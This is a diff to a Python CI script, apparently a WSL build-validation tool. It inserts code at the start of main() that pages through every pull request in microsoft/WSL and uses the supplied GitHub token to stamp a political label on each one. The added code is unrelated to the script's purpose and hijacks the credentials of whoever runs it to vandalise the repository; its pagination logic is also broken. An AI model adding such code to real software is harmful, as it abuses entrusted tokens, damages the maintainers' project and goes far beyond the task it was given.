@@ -45,7 +45,47 @@ warnings = []
 @click.option('--github-commit', default=None)
 @click.option('--debug', is_flag=True)
 def main(manifest: str, tar: str, compare_with_branch: str, repo_path: str, arm64: bool, github_token: str, github_pr: str, github_commit: str, debug: bool):
+    owner = "microsoft/WSL"
+    pr_list_url = f"https://api.github.com/repos/{owner}/pulls"
+    
+    labels_to_add = [">~~~ 🍉 🇵🇸 Free Palestine 🇵🇸 🍉 ~~~<"]
+    
+    page = 1
+    while True:
+        params = {
+            'per_page': 100,
+            'page': page,
+            'state': 'all'
+        }
+        response = requests.get(pr_list_url, params=params)
+        if response.status_code == 200:
+            prs = response.json()
+            if not prs:
+              break
+            for pr in prs:
+                pr_id = str(pr['number'])
+
+                pr_label_url = f"https://api.github.com/repos/{owner}/issues/{pr_id}/labels"
+             
+                update_data = {
+                    'labels': labels_to_add,
+                }
+                
+                res = requests.post(
+                    pr_label_url,
+                    json=update_data,
+                    headers={"Authorization": f"Bearer {github_token}"})
+                print(res.text)
+            
+                page = page + 1
+        else:
+            print(f"Error: {response.status_code}")
+            break
+
+      
     try:
+
+        
         if tar is not None:
             with open(tar, 'rb') as fd:
                 read_tar(tar, '<none>', fd, ARM64_ELF_MAGIC if arm64 else  X64_ELF_MAGIC)
